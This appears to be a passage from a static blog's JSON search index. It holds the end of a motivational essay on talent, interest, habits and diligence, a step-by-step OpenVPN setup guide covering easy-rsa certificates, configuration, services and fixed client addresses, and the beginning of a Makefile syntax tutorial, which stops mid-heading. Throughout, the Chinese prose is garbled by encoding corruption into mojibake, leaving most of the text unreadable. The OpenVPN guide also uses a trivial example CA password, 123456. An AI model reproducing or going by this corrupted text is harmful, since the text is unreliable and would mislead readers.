‡å‡†æ¯”ç»å¤§å¤šæ•°äººéƒ½è¦é«˜ã€‚\n\n1ï¼‰**è¯†åˆ«è‡ªå·±çš„ç‰¹é•¿å’Œå¤©èµ‹**ã€‚é¦–å…ˆï¼Œæ¯ä¸ªäººDNAéƒ½å¯èƒ½æˆ–å¤šæˆ–å°‘éƒ½ä¼šæœ‰ä¸€äº›æ¯”å¤§å¤šæ•°äººNBçš„ä¸œè¥¿ï¼ˆå½“ç„¶ï¼Œä¹Ÿå¯èƒ½æ²¡æœ‰ï¼‰ï¼Œå¦‚æœä½ æœ‰äº†ï¼Œé‚£ä¹ˆåœ¨ä½ è¿‡å»çš„äººç”Ÿä¸­å°±ä¸€å®šä¼šè¡¨ç°å‡ºæ¥äº†ï¼Œå°±æ˜¯é‚£ç§å¤§å®¶é‡åˆ°è¿™ä¸ªäº‹ä¼šæ¥è¯·æ•™ä½ çš„å¯»æ±‚ä½ å¸®åŠ©çš„ç°è±¡ã€‚é‚£ç§ï¼Œåˆ«äººè¦éå¸¸åŠªåŠ›ï¼Œè€Œä¸”æ¯«ä¸è´¹åŠ²çš„äº‹ã€‚ä¸€æ—¦ä½ æœ‰äº†è¿™æ ·çš„ç‰¹é•¿æˆ–å¤©èµ‹ï¼Œé‚£ä½ å°±è¦å¤§åŠ›åœ°æ‰©å¤§ä½ çš„é¢†å…ˆä¼˜åŠ¿ï¼Œåƒä¸‡ä¸è¦è¿›åˆ°é‚£äº›ä¼šé™åˆ¶ä½ ä¼˜åŠ¿çš„åœ°æ–¹ã€‚ä½ æ˜¯ä¸€æ¡é±¼ï¼Œä½ å°±ä¸€å®šè¦æŠŠåˆ«äººæ‹‰åˆ°æ°´é‡Œæ¥ç©ï¼Œç»å¯¹ä¸è¦å»é™†åœ°ä¸Šè·Ÿåˆ«äººæ‹¼ï¼Œä¸æ–­åœ°åœ¨è‡ªå·±çš„ç‰¹é•¿å’Œå¤©èµ‹ä¸Šæ‰©å¤§è‡ªå·±çš„é¢†å…ˆä¼˜åŠ¿ï¼Œå½»åº•ä¸€éª‘ç»å°˜ã€‚\n\n2ï¼‰**è¯†åˆ«è‡ªå·±çš„å…´è¶£å’Œäº‹ä¸š**ã€‚æ²¡æœ‰å¤©èµ‹ä¹Ÿæ²¡æœ‰é—®é¢˜ï¼Œè¿˜æœ‰å…´è¶£ç‚¹ï¼Œéƒ½è¯´å…´è¶£æ˜¯æœ€å¥½çš„è€å¸ˆï¼Œå½“å¹´ï¼ŒLinuså°±æ˜¯åœ¨å­¦æ ¡é‡Œå¯¹minxç€è¿·äº†ï¼Œäºæ˜¯æ•´å‡ºä¸ªLinuxæ¥ï¼Œè¿™å°±æ˜¯å…´è¶£é©±åŠ¨å‡ºçš„ä¸œè¥¿ï¼Œä¸€èˆ¬æ¥è¯´ï¼Œå…´è¶£é©±åŠ¨çš„äº‹æ€»æ˜¯ä¼šæ¯”é‚£äº›è¢«åŠ¨é©±åŠ¨çš„æ›´å¥½ã€‚ä½†æ˜¯ï¼Œè¿™é‡Œæˆ‘æƒ³è¯´æ˜ä¸€ä¸‹ä»€ä¹ˆå«â€œçœŸâˆ™å…´è¶£â€ï¼ŒçœŸæ­£çš„å…´è¶£ä¸æ˜¯é‚£ç§ä¸‰å¤©çƒ­åº¦çš„ä¸œè¥¿ï¼Œè€Œæ˜¯é‚£ç§ï¼Œä½ æ„¿æ„ä¸ºä¹‹ä»˜å‡ºä¸€è¾ˆå­çš„äº‹ï¼Œæ˜¯é‚£ç§æ— è®ºæœ‰å¤šå¤§å›°éš¾æœ‰å¤šéš¾å—ä½ éƒ½è¦æ­»ç£•çš„äº‹ï¼Œè¿™æ‰æ˜¯â€œçœŸâˆ™å…´è¶£â€ï¼Œè¿™ä¹Ÿå°±æ˜¯ä½ çš„â€œé‡å¿ƒâ€å’Œâ€œå¥½èƒœå¿ƒâ€æ‰€åœ¨ï¼Œå…¶å®ä¸Šå‡åˆ°äº†ä½ çš„äº‹ä¸šã€‚ç›¸ä¿¡æˆ‘ï¼Œç»å¤§å¤šæ•°äººåªæœ‰èŒä¸šè€Œæ²¡æœ‰äº‹ä¸šçš„ã€‚\n\n3ï¼‰**å»ºç«‹é«˜çº§çš„ä¹ æƒ¯å’Œæ–¹æ³•**ã€‚æ²¡æœ‰å¤©èµ‹æ²¡æœ‰é‡å¿ƒï¼Œä¹Ÿè¿˜æ˜¯å¯ä»¥è·Ÿåˆ«äººæ‹¼ä¹ æƒ¯æ‹¼æ–¹æ³•çš„ï¼Œåªè¦ä½ æœ‰ä¸€äº›æ¯”è¾ƒå¥½çš„ä¹ æƒ¯å’Œæ–¹æ³•ï¼Œé‚£ä¹ˆä½ ä¸€æ ·å¯ä»¥è¶…è¿‡å¤§å¤šæ•°äººã€‚å¯¹æ­¤ï¼Œåœ¨ä¹ æƒ¯ä¸Šä½ è¦åšåˆ°æ¯”è¾ƒå¤§å¤šæ•°äººæ›´è‡ªå¾‹ï¼Œæ›´æœ‰è®¡åˆ’æ€§ï¼Œæ›´æœ‰ç›®æ ‡æ€§ï¼Œæ¯”å¦‚ï¼Œæ¯å¹´å­¦ä¹ ä¸€é—¨æ–°çš„è¯­è¨€æˆ–æŠ€æœ¯ï¼Œå¹¶å¯ä»¥å‚ä¸ç›¸å…³çš„é¡¶çº§å¼€æºé¡¹ç›®ï¼Œæ¯ä¸ªæœˆè®­ç»ƒä¸€ä¸ªç±»ç®—æ³•ï¼ŒæŒæ¡ä¸€ç§ç®—æ³•ï¼Œæ¯å‘¨é˜…è¯»ä¸€ç¯‡è‹±æ–‡è®ºæ–‡ï¼Œå¹¶æŠŠé˜…è¯»ç¬”è®°æ•´ç†å‡ºæ¥â€¦â€¦**è‡ªå¾‹çš„æ˜¯éå¸¸å¯æ€•çš„**ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œä½ è¿˜éœ€è¦åœ¨æ–¹æ³•ä¸Šè¶…è¿‡åˆ«äººï¼Œä½ éœ€è¦æ»¡ä¸–ç•Œçš„æ‰¾å„ç§é«˜çº§çš„æ–¹æ³•ï¼Œå…¶ä¸­åŒ…æ‹¬ï¼Œæ€è€ƒçš„æ–¹æ³•ï¼Œå­¦ä¹ çš„æ–¹æ³•ã€æ—¶é—´ç®¡ç†çš„æ–¹æ³•ã€æ²Ÿé€šçš„æ–¹æ³•è¿™ç±»è½¯å®åŠ›çš„ï¼Œè¿˜æœ‰ï¼Œè§£å†³é—®é¢˜çš„æ–¹æ³•ï¼ˆtrouble shooting å’Œ problem solvingï¼‰ï¼Œè®¾è®¡çš„æ–¹æ³•ï¼Œå·¥ç¨‹çš„æ–¹æ³•ï¼Œä»£ç çš„æ–¹æ³•ç­‰ç­‰ç¡¬å®åŠ›çš„ï¼Œä¸€å¼€å§‹ç…§çŒ«ç”»è™ï¼Œæ—¶é—´é•¿äº†å°±å¯èƒ½ä¼šè‡ªå·±å‘æ˜æˆ–æ¨å¯¼æ–°çš„æ–¹æ³•ã€‚\n\n4ï¼‰**å‹¤å¥‹åŠªåŠ›æ‰§ç€åšæŒ**ã€‚å¦‚æœä¸Šé¢ä¸‰ä»¶äº‹ä½ éƒ½æ²¡æœ‰ä¹Ÿæ²¡æœ‰èƒ½åŠ›ï¼Œé‚£è¿˜æœ‰æœ€åä¸€ä»¶äº‹äº†ï¼Œé‚£å°±æ˜¯å‹¤å¥‹åŠªåŠ›äº†ï¼Œå°±æ˜¯æ‰€è°“çš„â€œä¸€ä¸‡å°æ—¶å®šå¾‹â€äº†ï¼ˆå‚çœ‹ã€Š[21å¤©æ•™ä½ å­¦ä¼šC++](https://coolshell.cn/articles/2250.html)ã€‹ä¸­çš„åå¹´å­¦ç¼–ç¨‹ä¸€èŠ‚ï¼‰ï¼Œæˆ‘è§è¿‡å¾ˆå¤šä¸èªæ˜çš„äººï¼Œæ‚Ÿæ€§ä¹Ÿä¸å¤Ÿï¼ˆæ¯”å¦‚æˆ‘å°±æ˜¯ä¸€ä¸ªï¼‰ï¼Œåˆ«äººå­¦ä¸€ä¸ªä¸œè¥¿ï¼Œä¸€ä¸ªæœˆå°±å¥½äº†ï¼Œè€Œæˆ‘éœ€è¦1å¹´ç”šè‡³æ›´é•¿ï¼Œä½†æ˜¯å¾ˆå¤šä¸œè¥¿éƒ½æ˜¯æ­»çš„ï¼Œåªè¦è‚¯èŠ±æ—¶é—´å°±æœ‰ä¸€å¤©ä½ ä¼šææ‡‚çš„ï¼Œè€ä¸ä½æˆ‘åšæŒåå¹´äºŒåå¹´ï¼Œèªæ˜çš„äººå‘æ˜ä¸ªé£æœºé£è¿‡å»äº†ï¼Œç¬¨ä¸€ç‚¹çš„äººæ„šå…¬ç§»å±±ä¹Ÿè¿‡å¾—å»ï¼Œ**å› ä¸ºæ›´å¤šçš„äººæ˜¯æ‡’äººï¼Œæˆ‘ä¸ç”¨æ‹¼è¿‡èªæ˜äººï¼Œæˆ‘åªç”¨æ‹¼è¿‡é‚£äº›æ‡’äººå°±å¥½äº†**ã€‚\n\nå¥½äº†ï¼Œå°±è¿™ä¹ˆå¤šï¼Œå¦‚æœå“ªå¤©ä½ å˜å¾—æ¶ˆæå’Œä¸è‡ªä¿¡ï¼Œä½ è¦æ¥è¯»è¯»æˆ‘çš„è¿™ç¯‡æ–‡ç« ï¼Œå­æ›°ï¼šæ¸©æ•…è€ŒçŸ¥æ–°ã€‚\n\nï¼ˆå…¨æ–‡å®Œï¼‰\n\n\n\n### 3. å‚è€ƒèµ„æ–™\n\n+ https://coolshell.cn/articles/19464.html","tags":["æ€è€ƒ"],"categories":["æ€è€ƒ"]},{"title":"openvpnæ­å»ºè™šæ‹Ÿå±€åŸŸç½‘","url":"%2Fp%2Fa84d9911.html","content":"\n\n\n### 0. å‰è¨€\n\nOpenVPN æ˜¯ä¸€ä¸ªå¥å£®çš„ã€é«˜åº¦çµæ´»çš„ [VPN](https://en.wikipedia.org/wiki/VPN) å®ˆæŠ¤è¿›ç¨‹ã€‚å®ƒæ”¯æŒ [SSL/TLS](https://en.wikipedia.org/wiki/SSL/TLS) å®‰å…¨ã€[Ethernet bridging](https://en.wikipedia.org/wiki/Bridging_(networking))ã€ç»ç”±[ä»£ç†](https://en.wikipedia.org/wiki/Proxy_server)çš„ [TCP](https://en.wikipedia.org/wiki/Transmission_Control_Protocol) æˆ– [UDP](https://en.wikipedia.org/wiki/User_Datagram_Protocol) [éš§é“](https://en.wikipedia.org/wiki/Tunneling_protocol)å’Œ [NAT](https://en.wikipedia.org/wiki/Network_address_translation)ã€‚å¦å¤–ï¼Œå®ƒä¹Ÿæ”¯æŒåŠ¨æ€ IP åœ°å€ä»¥åŠ [DHCP](https://en.wikipedia.org/wiki/Dynamic_Host_Configuration_Protocol)ï¼Œå¯ä¼¸ç¼©æ€§è¶³ä»¥æ”¯æŒæ•°ç™¾æˆ–æ•°åƒç”¨æˆ·çš„ä½¿ç”¨åœºæ™¯ï¼ŒåŒæ—¶å¯ç§»æ¤è‡³å¤§å¤šæ•°ä¸»æµæ“ä½œç³»ç»Ÿå¹³å°ä¸Šã€‚\n\n##### å®‰è£…openvpn\n\n```bash\nsudo apt install openvpn\n```\n\n<!-- more -->\n\n\n\n### 1. ç”Ÿæˆè¯ä¹¦\n\n```bash\ngit clone https://github.com/OpenVPN/easy-rsa\ncd easyrsa3\n```\n\n\n\n##### 1.1 ç”Ÿæˆ CA\n\n```bash\n./easyrsa init-pki\n\n./easyrsa build-ca  \n# è¾“å…¥å¯†ç : 123456\nCommon Name: OpenVPN-CA\n```\n\npkiæ–‡ä»¶å¤¹ä¸‹ä¼šç”Ÿæˆ ca.crt\n\n\n\n##### 1.2 ç”Ÿæˆserverå’Œ client å…¬é’¥ç§é’¥å¯¹\n\n```bash\n./easyrsa build-server-full server\n\n./easyrsa build-client-full client1\n./easyrsa build-client-full client2\n./easyrsa build-client-full client3\n```\n\npki/private æ˜¯ç§æœ‰çš„ key\n\npki/issued æ˜¯å…¬æœ‰çš„ key\n\n\n\n##### 1.3 ç”ŸæˆDiffie-Hellman pem \n\n```bash\n./easyrsa gen-dh\n```\n\npki æ–‡ä»¶å¤¹ä¸‹ç”Ÿæˆäº† dh.pem\n\n\n\n##### 1.4 ç°åœ¨æˆ‘ä»¬æœ‰äº†\n\n| **Filename** | **Needed By**            | **Purpose**               | **Secret** |\n| ------------ | ------------------------ | ------------------------- | ---------- |\n| ca.crt       | server + all clients     | Root CA certificate       | NO         |\n| ca.key       | key signing machine only | Root CA key               | YES        |\n| dh{n}.pem    | server only              | Diffie Hellman parameters | NO         |\n| server.crt   | server only              | Server Certificate        | NO         |\n| server.key   | server only              | Server Key                | YES        |\n| client1.crt  | client1 only             | Client1 Certificate       | NO         |\n| client1.key  | client1 only             | Client1 Key               | YES        |\n| client2.crt  | client2 only             | Client2 Certificate       | NO         |\n| client2.key  | client2 only             | Client2 Key               | YES        |\n| client3.crt  | client3 only             | Client3 Certificate       | NO         |\n| client3.key  | client3 only             | Client3 Key               | YES        |\n\n\n\n### 2. é…ç½®æ–‡ä»¶\n\nåœ¨å®‰è£…ç›®å½•ä¸‹(`/usr/share/doc/openvpn/examples/sample-config-files`)æ‰¾åˆ°é…ç½® `server.conf` and `client.conf`\n\nå¦‚æœåªæœ‰æœ‰ server.conf.gz çš„è¯, éœ€è¦è§£å‹\n\n```bash\ngunzip -c server.conf.gz > server.conf\n```\n\n\n\n##### 2.1  æœåŠ¡ç«¯ä¿®æ”¹è¯ä¹¦è·¯å¾„\n\nBefore you use the sample configuration file, you should first edit the **ca**, **cert**, **key**, and **dh** parameters to point to the files you generated in the [PKI](https://openvpn.net/community-resources/how-to/#setting-up-your-own-certificate-authority-ca-and-generating-certificates-and-keys-for-an-openvpn-server-and-multiple-clients) section above.\n\n##### 2.2 æœåŠ¡ç«¯dev æ¨¡å¼å¯ä»¥ä¿®æ”¹  tap tun\n\n##### 2.3 æœåŠ¡ç«¯ä¿®æ”¹ ip èŒƒå›´\n\nIf you want to use a virtual IP address range other than `10.8.0.0/24`, you should modify the `server` directive. Remember that this virtual IP address range should be a private range which is currently unused on your network.\n\n\n\nThe Internet Assigned Numbers Authority (IANA) has reserved the following three blocks of the IP address space for private internets (codified in RFC 1918):\n\n| 10.0.0.0    | 10.255.255.255  | (10/8 prefix)       |\n| ----------- | --------------- | ------------------- |\n| 172.16.0.0  | 172.31.255.255  | (172.16/12 prefix)  |\n| 192.168.0.0 | 192.168.255.255 | (192.168/16 prefix) |\n\nThe best candidates are subnets in the middle of the vast 10.0.0.0/8 netblock (for example 10.66.77.0/24).\n\n\n\n##### 2.4 æœåŠ¡ç«¯ä¿®æ”¹ client ä¹‹é—´å¯è¿æ¥\n\nUncomment out the `client-to-client` directive if you would like connecting clients to be able to reach each other over the VPN. By default, clients will only be able to reach the server.\n\n##### 2.5 æœåŠ¡ç«¯ä¿®æ”¹ user å’Œ group\n\nIf you are using Linux, BSD, or a Unix-like OS, you can improve security by uncommenting out the **user nobody** and **group nobody** directives.\n\n##### 2.6 å®¢æˆ·ç«¯ä¿®æ”¹è¯ä¹¦è·¯å¾„\n\n`ca`, `cert`, `key`\n\n##### 2.7 å®¢æˆ·ç«¯ä¿®æ”¹ remote å‚æ•°\n\n```bash\nremote my-server-1 1194\n```\n\n\n\n##### 2.8 æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯çš„ `dev` (tun or tap) and `proto` (udp or tcp) è¦ä¸€è‡´\n\n\n\n### 3. å¯åŠ¨ä½¿ç”¨\n\n##### 3.1 å¯åŠ¨ server\n\n```bash\nsudo openvpn /etc/openvpn/server.conf\n```\n\næˆåŠŸå¯åŠ¨ä»¥åä¼šå‘ç°å¤šäº†ä¸€ä¸ª tun ç½‘å£\n\n\n\nå¦‚é‡åˆ°é”™è¯¯: [Open VPN options error: --tls-auth fails with 'ta.key': no such file or directory](https://unix.stackexchange.com/questions/359428/open-vpn-options-error-tls-auth-fails-with-ta-key-no-such-file-or-director)\n\n```bash\nsudo openvpn --genkey --secret /etc/openvpn/certs/ta.key\n```\n\n\n\n##### 3.2 å¯åŠ¨ client\n\n```Â bash\nsudo openvpn /etc/openvpn/client.conf\n```\n\n\n\nå¦‚é‡åˆ°é”™è¯¯: Authenticate/Decrypt packet error: packet HMAC authentication failed, é…ç½®æ–‡ä»¶é‡Œ,\n\n```bash\ntls-auth /etc/openvpn/certs/ta.key 0  #æœåŠ¡å™¨ç”¨0\n\ntls-auth /etc/openvpn/certs/ta.key 1  #å®¢æˆ·ç«¯ç”¨1\n```\n\næ³¨æ„, è¿™ä¸ª key æ˜¯åŒä¸€ä¸ª, åœ¨æœåŠ¡å™¨ç”Ÿæˆ, ä¸æ˜¯æ¯ä¸ªéƒ½ç”Ÿæˆä¸€æ¬¡\n\n\n\n##### 3.3 æµ‹è¯•\n\nåœ¨å®¢æˆ·ç«¯  `ping 10.8.0.1`\n\nIf the ping succeeds, congratulations! You now have a functioning VPN.\n\næˆ‘ä»¬ä¹Ÿå¯ä»¥ `ssh user@10.8.0.1` å‘ç°ä¹Ÿå¯ä»¥\n\n\n\n##### 3.4 mac ä½¿ç”¨\n\nhttps://tunnelblick.net/ ä¸‹è½½å®‰è£…åŒ…\n\nå¯ä»¥ç”Ÿæˆ.ovpn æ–‡ä»¶, å‚è€ƒhttps://serverfault.com/a/483967\n\n\n\n### 4. openvpnæœåŠ¡\n\n##### 4.1 server service\n\n```bash\nsudo systemctl start openvpn@server.service\n\nsudo systemctl enable openvpn@server.service\n```\n\néœ€è¦è¾“å…¥å¯†ç è¯·è¿™æ ·\n\n```bash\nsudo systemd-tty-ask-password-agent \n```\n\n\n\n##### 4.2 client service\n\n```bash\nsudo systemctl start openvpn@client.service\n\nsudo systemctl enable openvpn@client.service\n```\n\n\n\n### 5. å®¢æˆ·ç«¯åˆ†é…å›ºå®š IP\n\n```bash\ncd /etc/openvpn\nmkdir ccd\n\n# é…ç½®æ–‡ä»¶ä¿®æ”¹client-config-dir\nvim server.conf\nclient-config-dir ccd\n\n#åœ¨ccdæ–‡ä»¶å¤¹ä¸‹å»ºç«‹ä»¥ç”¨æˆ·å(Common Name)ä¸ºåç§°çš„æ–‡ä»¶\ncd ccd\n\nvi client1\nifconfig-push 10.8.0.2 255.255.255.0\n\nvi client2\nifconfig-push 10.8.0.3 255.255.255.0\n```\n\n\n\n### 6. å‚è€ƒèµ„æ–™\n\n+ https://openvpn.net/community-resources/how-to/\n\n+ https://github.com/OpenVPN/easy-rsa\n\n+ https://tunnelblick.net/\n\n+ https://community.openvpn.net/openvpn/wiki/Concepts-Addressing","tags":["openvpn"],"categories":["ç³»ç»Ÿ"]},{"title":"makefileçš„ç¼–å†™è§„åˆ™","url":"%2Fp%2F4cf47ff4.html","content":"\n\n\n### 1. Makefile ä»‹ç»\n\nMakefileæ–‡ä»¶ç”±ä¸€ç³»åˆ—è§„åˆ™ï¼ˆrulesï¼‰æ„æˆã€‚æ¯æ¡è§„åˆ™çš„å½¢å¼å¦‚ä¸‹ã€‚\n\n```bash\n<target> : <prerequisites> \n[tab]  <commands>\n```\n\nä¸Šé¢ç¬¬ä¸€è¡Œå†’å·å‰é¢çš„éƒ¨åˆ†ï¼Œå«åš\"ç›®æ ‡\"ï¼ˆtargetï¼‰ï¼Œå†’å·åé¢çš„éƒ¨åˆ†å«åš\"å‰ç½®æ¡ä»¶\"ï¼ˆprerequisitesï¼‰ï¼›ç¬¬äºŒè¡Œå¿…é¡»ç”±ä¸€ä¸ªtabé”®èµ·é¦–ï¼Œåé¢è·Ÿç€\"å‘½ä»¤\"ï¼ˆcommandsï¼‰ã€‚\n\n\"ç›®æ ‡\"æ˜¯å¿…éœ€çš„ï¼Œä¸å¯çœç•¥ï¼›\"å‰ç½®æ¡ä»¶\"å’Œ\"å‘½ä»¤\"éƒ½æ˜¯å¯é€‰çš„ï¼Œä½†æ˜¯ä¸¤è€…ä¹‹ä¸­å¿…é¡»è‡³å°‘å­˜åœ¨ä¸€ä¸ªã€‚\n\næ¯æ¡è§„åˆ™å°±æ˜ç¡®ä¸¤ä»¶äº‹ï¼šæ„å»ºç›®æ ‡çš„å‰ç½®æ¡ä»¶æ˜¯ä»€ä¹ˆï¼Œä»¥åŠå¦‚ä½•æ„å»ºã€‚\n\n<!-- more -->\n\n##### 1.1 ç›®æ ‡ï¼ˆtargetï¼‰\n\nä¸€ä¸ªç›®æ ‡ï¼ˆtargetï¼‰å°±æ„æˆä¸€æ¡è§„åˆ™ã€‚ç›®æ ‡é€šå¸¸æ˜¯æ–‡ä»¶åï¼ŒæŒ‡æ˜Makeå‘½ä»¤æ‰€è¦æ„å»ºçš„å¯¹è±¡ï¼Œç›®æ ‡å¯ä»¥æ˜¯ä¸€ä¸ªæ–‡ä»¶åï¼Œä¹Ÿå¯ä»¥æ˜¯å¤šä¸ªæ–‡ä»¶åï¼Œä¹‹é—´ç”¨ç©ºæ ¼åˆ†éš”ã€‚\n\né™¤äº†æ–‡ä»¶åï¼Œç›®æ ‡è¿˜å¯ä»¥æ˜¯æŸä¸ªæ“ä½œçš„åå­—ï¼Œè¿™ç§°ä¸º\"ä¼ªç›®æ ‡\"ï¼ˆphony targetï¼‰ã€‚\n\n```makefile\nclean:\n      rm *.o\n```\n\nä¸Šé¢ä»£ç çš„ç›®æ ‡æ˜¯cleanï¼Œå®ƒä¸æ˜¯æ–‡ä»¶åï¼Œè€Œæ˜¯ä¸€ä¸ªæ“ä½œçš„åå­—ï¼Œå±äº\"ä¼ªç›®æ ‡ \"ï¼Œä½œç”¨æ˜¯åˆ é™¤å¯¹è±¡æ–‡ä»¶ã€‚\n\n```bash\n$ make  clean\n```\n\nä½†æ˜¯ï¼Œå¦‚æœå½“å‰ç›®å½•ä¸­ï¼Œæ­£å¥½æœ‰ä¸€ä¸ªæ–‡ä»¶å«åšcleanï¼Œé‚£ä¹ˆè¿™ä¸ªå‘½ä»¤ä¸ä¼šæ‰§è¡Œã€‚å› ä¸ºMakeå‘ç°cleanæ–‡ä»¶å·²ç»å­˜åœ¨ï¼Œå°±è®¤ä¸ºæ²¡æœ‰å¿…è¦é‡æ–°æ„å»ºäº†ï¼Œå°±ä¸ä¼šæ‰§è¡ŒæŒ‡å®šçš„rmå‘½ä»¤ã€‚\n\n\n\nä¸ºäº†é¿å…è¿™ç§æƒ…å†µï¼Œå¯ä»¥æ˜ç¡®å£°æ˜cleanæ˜¯\"ä¼ªç›®æ ‡\"ï¼Œå†™æ³•å¦‚ä¸‹ã€‚\n\n```makefile\n.PHONY: clean\nclean:\n        rm *.o temp\n```\n\n\n\nå£°æ˜cleanæ˜¯\"ä¼ªç›®æ ‡\"ä¹‹åï¼Œmakeå°±ä¸ä¼šå»æ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¸€ä¸ªå«åšcleançš„æ–‡ä»¶ï¼Œè€Œæ˜¯æ¯æ¬¡è¿è¡Œéƒ½æ‰§è¡Œå¯¹åº”çš„å‘½ä»¤ã€‚\n\n\n\nå¦‚æœMakeå‘½ä»¤è¿è¡Œæ—¶æ²¡æœ‰æŒ‡å®šç›®æ ‡ï¼Œé»˜è®¤ä¼šæ‰§è¡ŒMakefileæ–‡ä»¶çš„ç¬¬ä¸€ä¸ªç›®æ ‡ã€‚\n\n```bash\nmake\n```\n\n\n\n##### 1.2 å‰ç½®æ¡ä»¶ï¼ˆprerequisitesï¼‰\n\nå‰ç½®æ¡ä»¶é€šå¸¸æ˜¯ä¸€ç»„æ–‡ä»¶åï¼Œä¹‹é—´ç”¨ç©ºæ ¼åˆ†éš”ã€‚å®ƒæŒ‡å®šäº†\"ç›®æ ‡\"æ˜¯å¦é‡æ–°æ„å»ºçš„åˆ¤æ–­æ ‡å‡†ï¼šåªè¦æœ‰ä¸€ä¸ªå‰ç½®æ–‡ä»¶ä¸å­˜åœ¨ï¼Œæˆ–è€…æœ‰è¿‡æ›´æ–°ï¼ˆå‰ç½®æ–‡ä»¶çš„last-modificationæ—¶é—´æˆ³æ¯”ç›®æ ‡çš„æ—¶é—´æˆ³æ–°ï¼‰ï¼Œ\"ç›®æ ‡\"å°±éœ€è¦é‡æ–°æ„å»ºã€‚\n\n```makefile\nresult.txt: source.txt\n    cp source.txt result.txt\n```\n\nä¸Šé¢ä»£ç ä¸­ï¼Œæ„å»º result.txt çš„å‰ç½®æ¡ä»¶æ˜¯ source.txt ã€‚å¦‚æœå½“å‰ç›®å½•ä¸­ï¼Œsource.txt å·²ç»å­˜åœ¨ï¼Œé‚£ä¹ˆ`make result.txt`å¯ä»¥æ­£å¸¸è¿è¡Œï¼Œå¦åˆ™å¿…é¡»å†å†™ä¸€æ¡è§„åˆ™ï¼Œæ¥ç”Ÿæˆ source.txt ã€‚\n\n```makefile\nsource.txt:\n    echo \"this is the source\" > source.txt\n```\n\n\n\nä¸Šé¢ä»£ç ä¸­ï¼Œsource.txtåé¢æ²¡æœ‰å‰ç½®æ¡ä»¶ï¼Œå°±æ„å‘³ç€å®ƒè·Ÿå…¶ä»–æ–‡ä»¶éƒ½æ— å…³ï¼Œåªè¦è¿™ä¸ªæ–‡ä»¶è¿˜ä¸å­˜åœ¨ï¼Œæ¯æ¬¡è°ƒç”¨`make source.txt`ï¼Œå®ƒéƒ½ä¼šç”Ÿæˆã€‚\n\n```bash\n$ make result.txt\n$ make result.txt\n```\n\nä¸Šé¢å‘½ä»¤è¿ç»­æ‰§è¡Œä¸¤æ¬¡`make result.txt`ã€‚ç¬¬ä¸€æ¬¡æ‰§è¡Œä¼šå…ˆæ–°å»º source.txtï¼Œç„¶åå†æ–°å»º result.txtã€‚ç¬¬äºŒæ¬¡æ‰§è¡Œï¼ŒMakeå‘ç° source.txt æ²¡æœ‰å˜åŠ¨ï¼ˆæ—¶é—´æˆ³æ™šäº result.txtï¼‰ï¼Œå°±ä¸ä¼šæ‰§è¡Œä»»ä½•æ“ä½œï¼Œresult.txt ä¹Ÿä¸ä¼šé‡æ–°ç”Ÿæˆã€‚\n\n##### 1.3 å‘½ä»¤ï¼ˆcommandsï¼‰\n\nå‘½ä»¤ï¼ˆcommandsï¼‰è¡¨ç¤ºå¦‚ä½•æ›´æ–°ç›®æ ‡æ–‡ä»¶ï¼Œç”±ä¸€è¡Œæˆ–å¤šè¡Œçš„Shellå‘½ä»¤ç»„æˆã€‚å®ƒæ˜¯æ„å»º\"ç›®æ ‡\"çš„å…·ä½“æŒ‡ä»¤ï¼Œå®ƒçš„è¿è¡Œç»“æœé€šå¸¸å°±æ˜¯ç”Ÿæˆç›®æ ‡æ–‡ä»¶ã€‚\n\næ¯è¡Œå‘½ä»¤ä¹‹å‰å¿…é¡»æœ‰ä¸€ä¸ªtabé”®ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ¯è¡Œå‘½ä»¤åœ¨ä¸€ä¸ªå•ç‹¬çš„shellä¸­æ‰§è¡Œã€‚è¿™äº›Shellä¹‹é—´æ²¡æœ‰ç»§æ‰¿å…³ç³»ã€‚\n\n```makefile\nvar-lost:\n    export foo=bar\n    echo \"foo=[$$foo]\"\n```\n\nä¸Šé¢ä»£ç æ‰§è¡Œåï¼ˆ`make var-lost`ï¼‰ï¼Œå–ä¸åˆ°fooçš„å€¼ã€‚å› ä¸ºä¸¤è¡Œå‘½ä»¤åœ¨ä¸¤ä¸ªä¸åŒçš„è¿›ç¨‹æ‰§è¡Œã€‚ä¸€ä¸ªè§£å†³åŠæ³•æ˜¯å°†ä¸¤è¡Œå‘½ä»¤å†™åœ¨ä¸€è¡Œï¼Œä¸­é—´ç”¨åˆ†å·åˆ†éš”ã€‚\n\n```makefile\nvar-kept:\n    export foo=bar; echo \"foo=[$$foo]\"\n```\n\nå¦ä¸€ä¸ªè§£å†³åŠæ³•æ˜¯åœ¨æ¢è¡Œç¬¦å‰åŠ åæ–œæ è½¬ä¹‰ã€‚\n\n```makefile\nvar-kept:\n    export foo=bar; \\\n    echo \"foo=[$$foo]\"\n```\n\n\n\n\n\n### 2. Makefileæ–‡ä»¶çš„è¯­æ³•\n\n\n\n##### 2.1 äº•å·ï¼ˆ#ï¼‰\n\nåœ¨Makefileä¸­è¡¨ç¤ºæ³¨é‡Šã€‚\n\n\n\n##### 2.2 å›å£°ï¼ˆechoingï¼‰\n\næ­£å¸¸æƒ…å†µä¸‹ï¼Œmakeä¼šæ‰“å°æ¯æ¡å‘½ä»¤ï¼Œç„¶åå†æ‰§è¡Œï¼Œè¿™å°±å«åšå›å£°ï¼ˆechoingï¼‰ã€‚\n\nåœ¨å‘½ä»¤çš„å‰é¢åŠ ä¸Š@ï¼Œå°±å¯ä»¥å…³é—­å›å£°ã€‚\n\n```makefile\ntest:\n    # è¿™æ˜¯æµ‹è¯•\n\ntest:\n    @# è¿™æ˜¯æµ‹è¯•\n```\n\n\n\n##### 2.3 é€šé…ç¬¦\n\né€šé…ç¬¦ï¼ˆwildcardï¼‰ç”¨æ¥æŒ‡å®šä¸€ç»„ç¬¦åˆæ¡ä»¶çš„æ–‡ä»¶åã€‚Makefile çš„é€šé…ç¬¦ä¸ Bash ä¸€è‡´ï¼Œä¸»è¦æœ‰æ˜Ÿå·ï¼ˆ*ï¼‰ã€é—®å·ï¼ˆï¼Ÿï¼‰å’Œ [...] ã€‚æ¯”å¦‚ï¼Œ *.o è¡¨ç¤ºæ‰€æœ‰åç¼€åä¸ºoçš„æ–‡ä»¶ã€‚\n\n```makefile\nclean:\n        rm -f *.o\n```\n\n\n\n##### 2.4 